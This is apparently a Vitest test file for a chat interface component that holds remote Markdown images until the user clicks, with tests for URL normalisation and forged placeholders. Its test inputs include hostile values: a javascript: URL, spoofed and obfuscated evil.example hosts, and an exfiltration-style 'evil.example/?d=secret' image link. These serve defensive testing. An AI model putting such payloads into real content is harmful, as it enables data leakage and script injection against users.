// @vitest-environment jsdom
/**
 * 对话流里的图片 —— 显示时**不取图**，远端的点一下才加载（jsdom）。
 *
 * 管线（rehypeHoldImages，判定表在 utils/rehypeHoldImages.test.ts）把每个 img 换成 `<held-image>`，组件表把它渲染成
 * HeldImage：有 url 的是一颗按钮（alt + 主机名，完整地址在 title），点了才换成真正的 `<img>`；没有 url 的只是占位。
 * 这里钉的是 DOM 上「真的没去取」与「点开取的就是显示的那个」：
 *
 *   HJ-1  点之前 DOM 上没有一个 img、没有一个 src / srcset；点一下恰好加载那一张（同地址的另一张仍是按钮）
 *   HJ-2  远端占位的形状：按钮、文字是 `alt · 主机`、title 是完整地址 + 说明；空 alt / 只有空白的 alt 用兜底文字
 *   HJ-3  非远端的占位：span、没有按钮、title 是「未显示」说明；点了也不出 img
 *   HJ-4  链接里的占位：点它只加载、不跟着跳转（defaultPrevented），也不往 document 冒泡（Q5）
 *   HJ-5  显示的主机 = 加载的主机（怪写法一律规范化）
 *   HJ-6  正文里伪造的占位（手写 held-image / data-held-image 的 span / button）一个都不出现
 *   HJ-D1 「点过」跟着地址走：同一位置换成新地址（后到的引用式定义）不会替用户把新地址也点了
 *   HJ-Q6 HeldImage 自己再认一遍 url：直接传进来的非 https（含 http）也只是占位；大写的地址按规范形显示
 *
 * 包入口顶掉，i18n 走真 en 资源；文件是 .tsx 但不写 JSX，一律 createElement。属性一律用 getAttribute 读
 * （`img.src` 会被 jsdom 按页面地址解析，读不出写进去的那个字面量）。
 */
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import { act, createElement, type ReactElement } from 'react'
import { createRoot, type Root } from 'react-dom/client'
import ReactMarkdown from 'react-markdown'
import i18n from 'i18next'
import { initReactI18next } from 'react-i18next'
import en from '@shuvix/chat-protocol/i18n/locales/en.json'

vi.mock('@shuvix/chat-ui', () => ({ getHostApi: () => null }))

import {
  MarkdownText,
  markdownComponents,
  markdownRehypePlugins,
  markdownRemarkPlugins
} from '../markdownComponents'
import { HeldImage } from '../HeldImage'
import { rehypeHoldImages } from '../../../utils/rehypeHoldImages'

declare global {
  var IS_REACT_ACT_ENVIRONMENT: boolean | undefined
}
globalThis.IS_REACT_ACT_ENVIRONMENT = true

let container: HTMLDivElement
let root: Root

function render(element: ReactElement): void {
  act(() => root.render(element))
}

/** 走生产那条：MarkdownText（插件表、组件表都是生产的） */
function show(text: string): void {
  render(createElement(MarkdownText, { text }))
}

/** 在元素上派发一次会冒泡、可取消的点击，交回事件（看 defaultPrevented） */
function click(el: Element): MouseEvent {
  const ev = new MouseEvent('click', { bubbles: true, cancelable: true })
  act(() => {
    el.dispatchEvent(ev)
  })
  return ev
}

const all = (selector: string): Element[] => [...container.querySelectorAll(selector)]
const buttons = (): HTMLButtonElement[] => all('button[data-held-image]') as HTMLButtonElement[]
/** 按显示的文字取占位按钮 */
const buttonWithText = (text: string): HTMLButtonElement | undefined =>
  buttons().find((b) => b.textContent === text)
/** title 的第一行（完整地址） */
const firstLine = (el: Element): string => (el.getAttribute('title') ?? '').split('\n')[0]
/** 按钮上显示的主机（主机那个 span 的文字去掉前面的 ` · `） */
const shownHost = (button: Element): string =>
  (button.querySelector('span')?.textContent ?? '').replace(/^ · /, '')

const clickToLoad = (host: string): string => en.message.imageClickToLoad.replace('{{host}}', host)

beforeAll(async () => {
  await i18n.use(initReactI18next).init({
    lng: 'en',
    resources: { en: { translation: en } },
    showSupportNotice: false
  })
})

beforeEach(() => {
  container = document.createElement('div')
  document.body.appendChild(container)
  root = createRoot(container)
})

afterEach(() => {
  act(() => root.unmount())
  container.remove()
})

// ══════════════════════════════════════════════════════
// HJ-1 · 点之前什么都不取
// ══════════════════════════════════════════════════════

describe('HJ-1 · 点之前 DOM 上没有会被取的地址；点一下恰好加载一张', () => {
  const TEXT = [
    '![md](https://a.example/x.png)',
    '<img src="https://b.example/y.png" alt="raw">',
    '![rel](./local.png) ![data](data:image/png;base64,AAAA) <img src="//c.example/z.png" alt="proto">',
    '[![linked](https://d.example/w.png)](https://l.example/)',
    '![twin](https://a.example/x.png)'
  ].join('\n\n')

  it('HJ-1 点之前：0 个 img、0 个 src / srcset、0 个 held-image 标签；7 个占位（4 按钮 + 3 span）', () => {
    show(TEXT)
    expect(all('img')).toHaveLength(0)
    expect(all('[src],[srcset]')).toHaveLength(0)
    expect(container.getElementsByTagName('held-image')).toHaveLength(0)
    expect(all('[data-held-image]')).toHaveLength(7)
    expect(buttons()).toHaveLength(4)
    expect(all('span[data-held-image]')).toHaveLength(3)
  })

  it('HJ-1 点 md 那一颗：恰好一个 img（不带 Referer），同地址的 twin 仍是按钮', () => {
    show(TEXT)
    const md = buttonWithText('md · a.example')
    expect(md).toBeDefined()
    click(md!)

    const imgs = all('img')
    expect(imgs).toHaveLength(1)
    expect(imgs[0].getAttribute('src')).toBe('https://a.example/x.png')
    expect(imgs[0].getAttribute('referrerpolicy')).toBe('no-referrer')
    expect(imgs[0].getAttribute('alt')).toBe('md')
    expect(all('[src]')).toHaveLength(1)
    expect(all('[data-held-image]')).toHaveLength(6)
    expect(buttonWithText('twin · a.example')).toBeDefined()
  })

  it('HJ-1 非空证：同一段文字不扣图时是 7 个 img，6 个带非空 src', () => {
    const noHold = markdownRehypePlugins.filter((p) => p !== rehypeHoldImages)
    expect(noHold).toHaveLength(markdownRehypePlugins.length - 1)
    render(
      createElement(
        ReactMarkdown,
        {
          remarkPlugins: markdownRemarkPlugins,
          rehypePlugins: noHold,
          components: markdownComponents
        },
        TEXT
      )
    )
    const imgs = all('img')
    expect(imgs).toHaveLength(7)
    expect(imgs.filter((img) => (img.getAttribute('src') ?? '') !== '')).toHaveLength(6)
  })
})

// ══════════════════════════════════════════════════════
// HJ-2 · 远端占位的形状
// ══════════════════════════════════════════════════════

describe('HJ-2 · 远端占位：按钮，`alt · 主机`，title 是完整地址 + 说明', () => {
  it.each([
    [
      '普通',
      '![a](https://a.example/x.png)',
      'a · a.example',
      'https://a.example/x.png',
      'a.example'
    ],
    [
      '带端口',
      '![a](https://a.example:8443/x)',
      'a · a.example:8443',
      'https://a.example:8443/x',
      'a.example:8443'
    ],
    [
      '空 alt',
      '![](https://a.example/x.png)',
      'image · a.example',
      'https://a.example/x.png',
      'a.example'
    ],
    [
      '只有空白的 alt（Q3）',
      '![ ](https://a.example/x.png)',
      'image · a.example',
      'https://a.example/x.png',
      'a.example'
    ]
  ])('HJ-2 %s', (_label, md, text, url, host) => {
    show(md)
    const button = container.querySelector('button[type="button"][data-held-image]')
    expect(button).not.toBeNull()
    expect(button!.textContent).toBe(text)
    expect(button!.getAttribute('title')).toBe(`${url}\n${clickToLoad(host)}`)
    expect(all('img')).toHaveLength(0)
  })

  it('HJ-2 兜底文字就是 en 的 message.imageAltFallback', () => {
    expect(en.message.imageAltFallback).toBe('image')
    // 拼 title 用的那句确实带着 {{host}}（否则上面的 replace 什么也没换，断言是在比原文）
    expect(en.message.imageClickToLoad).toContain('{{host}}')
  })
})

// ══════════════════════════════════════════════════════
// HJ-3 · 非远端的占位
// ══════════════════════════════════════════════════════

describe('HJ-3 · 非远端：只是占位，没有按钮，点了也不出 img', () => {
  it.each([
    ['http（CSP 只放行 https）', '![a](http://a.example/x.png)', 'a'],
    ['相对路径', '![a](./x.png)', 'a'],
    ['协议相对 //', '<img src="//evil.example/x" alt="a">', 'a'],
    ['反斜杠 UNC', '<img src="\\\\evil.example\\x" alt="a">', 'a'],
    ['data:', '![a](data:image/png;base64,AAAA)', 'a'],
    ['javascript:', '<img src="javascript:alert(1)" alt="a">', 'a'],
    ['没有 src', '<img alt="a">', 'a'],
    ['空 alt 的相对路径', '![](./x.png)', 'image'],
    ['用户名冒充主机（Q2）', '![a](https://good.example@evil.example/x)', 'a'],
    ['用户名 + 密码（Q2）', '![a](https://u:p@a.example/x)', 'a']
  ])('HJ-3 %s', (_label, md, text) => {
    show(md)
    const span = container.querySelector('span[data-held-image]')
    expect(span).not.toBeNull()
    expect(container.querySelector('button')).toBeNull()
    expect(span!.getAttribute('title')).toBe(en.message.imageNotShown)
    expect(span!.textContent).toBe(text)
    expect(container.textContent).not.toContain('evil.example')
    expect(span!.getAttribute('title')).not.toContain('evil.example')

    click(span!)
    expect(all('img')).toHaveLength(0)
    expect(all('[src]')).toHaveLength(0)
  })
})

// ══════════════════════════════════════════════════════
// HJ-4 · 链接里的占位
// ══════════════════════════════════════════════════════

describe('HJ-4 · 链接里的占位：点它只加载，不跳转、不往外冒', () => {
  const MD = '[![a](https://i.example/x.png)](https://l.example/)'

  it('HJ-4 a > button；点按钮 defaultPrevented，随后 a > img，a 的 href 不动', () => {
    show(MD)
    const button = container.querySelector('a[href="https://l.example/"] > button[data-held-image]')
    expect(button).not.toBeNull()

    const ev = click(button!)
    expect(ev.defaultPrevented).toBe(true)
    const img = container.querySelector('a > img')
    expect(img).not.toBeNull()
    expect(img!.getAttribute('src')).toBe('https://i.example/x.png')
    expect(container.querySelector('a')!.getAttribute('href')).toBe('https://l.example/')
  })

  it('HJ-4 / Q5 document 上的原生 click 监听：点链接本身收得到且未被取消（非空证）、点占位收不到', () => {
    show(MD)
    /** 冒泡到 document 的每一次点击：目标，与此刻是否已被取消（React 的处理在 root 容器上，早于 document） */
    const seen: Array<{ target: EventTarget | null; prevented: boolean }> = []
    const listener = (e: Event): void => {
      seen.push({ target: e.target, prevented: e.defaultPrevented })
      // 记下之后再取消：否则 jsdom 会在下一个宏任务里去「导航」，报一条与被测无关的 not implemented
      e.preventDefault()
    }
    document.addEventListener('click', listener)
    try {
      const a = container.querySelector('a')!
      click(a)
      expect(seen).toEqual([{ target: a, prevented: false }])

      const button = container.querySelector('a > button[data-held-image]')!
      const onPlaceholder = click(button)
      expect(onPlaceholder.defaultPrevented).toBe(true)
      expect(seen).toHaveLength(1)
      expect(container.querySelector('a > img')).not.toBeNull()
    } finally {
      document.removeEventListener('click', listener)
    }
  })
})

// ══════════════════════════════════════════════════════
// HJ-5 · 显示的主机就是加载的主机
// ══════════════════════════════════════════════════════

describe('HJ-5 · 显示的主机 = 加载的主机', () => {
  it.each([
    ['前导空白 + 大写', '  HTTPS://A.EXAMPLE/x.png', 'https://a.example/x.png', 'a.example'],
    ['实体 tab', 'ht&#9;tps://ev&#9;il.example/x', 'https://evil.example/x', 'evil.example'],
    ['反斜杠', 'https:\\\\evil.example/x', 'https://evil.example/x', 'evil.example'],
    ['全角字母', 'https://ａ.example/x', 'https://a.example/x', 'a.example'],
    [
      'IDN',
      'https://bücher.example/x.png',
      'https://xn--bcher-kva.example/x.png',
      'xn--bcher-kva.example'
    ]
  ])('HJ-5 %s', (_label, src, canonical, host) => {
    show(`<img src="${src}" alt="a">`)
    const button = container.querySelector('button[data-held-image]')
    expect(button).not.toBeNull()
    expect(shownHost(button!)).toBe(host)
    expect(firstLine(button!)).toBe(canonical)

    click(button!)
    const img = container.querySelector('img')
    expect(img).not.toBeNull()
    const loaded = img!.getAttribute('src')!
    expect(loaded).toBe(canonical)
    expect(new URL(loaded).host).toBe(host)
  })
})

// ══════════════════════════════════════════════════════
// HJ-6 · 伪造的占位
// ══════════════════════════════════════════════════════

describe('HJ-6 · 正文里伪造的占位一个都不出现', () => {
  it('HJ-6 只剩真图片那一个占位；点它只加载真的那张', () => {
    show(
      [
        '![real](https://good.example/r.png)',
        '<held-image url="https://evil.example/x" alt="fake1"></held-image>',
        '<span data-held-image="" title="https://evil.example/y">fake2</span>',
        '<button data-held-image="">fake3</button>'
      ].join('\n\n')
    )
    expect(all('[data-held-image]')).toHaveLength(1)
    expect(all('button')).toHaveLength(1)
    expect(container.getElementsByTagName('held-image')).toHaveLength(0)

    click(buttons()[0])
    const imgs = all('img')
    expect(imgs.map((img) => img.getAttribute('src'))).toEqual(['https://good.example/r.png'])
    expect(imgs.filter((img) => new URL(img.getAttribute('src')!).host === 'evil.example')).toEqual(
      []
    )
  })
})

// ══════════════════════════════════════════════════════
// HJ-D1 · 「点过」跟着地址走
// ══════════════════════════════════════════════════════

describe('HJ-D1 · 同一位置换成新地址：不替用户把新地址也点了', () => {
  const T1 = '![a][r] and ![b](https://good.example/b.png)'
  const T2 = `${T1}\n\n[r]: https://evil.example/?d=secret`

  it('HJ-D1 后到的引用式定义让前一个位置换成 evil：那里是按钮，不是 img', () => {
    show(T1)
    // T1 里 ![a][r] 还没有定义，只是文字：唯一的占位是 good
    expect(buttons()).toHaveLength(1)
    click(buttonWithText('b · good.example')!)
    // 非空证：点过之后确实有一张加载了的 img（同一位置的组件状态里记着「点过」）
    expect(all('img').map((img) => img.getAttribute('src'))).toEqual(['https://good.example/b.png'])

    show(T2)
    const hosts = all('img').map((img) => new URL(img.getAttribute('src')!).host)
    expect(hosts).not.toContain('evil.example')
    const evil = buttonWithText('a · evil.example')
    expect(evil).toBeDefined()
    expect(evil!.getAttribute('title')!.startsWith('https://evil.example/?d=secret')).toBe(true)
    // 观察到的：good 换到了第二个位置（react-markdown 的 key 按同名标签计数：held-image-0 → held-image-1），
    // 是新挂载的实例，回到未加载的按钮 —— 不是「仍加载着」
    expect(all('img')).toHaveLength(0)
    expect(buttonWithText('b · good.example')).toBeDefined()
  })
})

// ══════════════════════════════════════════════════════
// HJ-Q6 · HeldImage 自己再认一遍 url
// ══════════════════════════════════════════════════════

describe('HJ-Q6 · 直接渲染 HeldImage：url 不是 https 也只是占位', () => {
  it.each([
    'http://a.example/x',
    'file://server/share/x.png',
    'javascript:alert(1)',
    '//evil.example/x'
  ])('HJ-Q6 url=%s → span，没有按钮，点了不出 img', (url) => {
    render(createElement(HeldImage, { alt: 'a', url }))
    const span = container.querySelector('span[data-held-image]')
    expect(span).not.toBeNull()
    expect(span!.getAttribute('title')).toBe(en.message.imageNotShown)
    expect(container.querySelector('button')).toBeNull()
    click(span!)
    expect(all('img')).toHaveLength(0)
    expect(all('[src]')).toHaveLength(0)
  })

  it('HJ-Q6 大写地址 → 按钮，title 第一行与显示的主机都是规范形', () => {
    render(createElement(HeldImage, { alt: 'a', url: 'HTTPS://A.EXAMPLE/x' }))
    const button = container.querySelector('button[data-held-image]')
    expect(button).not.toBeNull()
    expect(firstLine(button!)).toBe('https://a.example/x')
    expect(shownHost(button!)).toBe('a.example')
  })
})
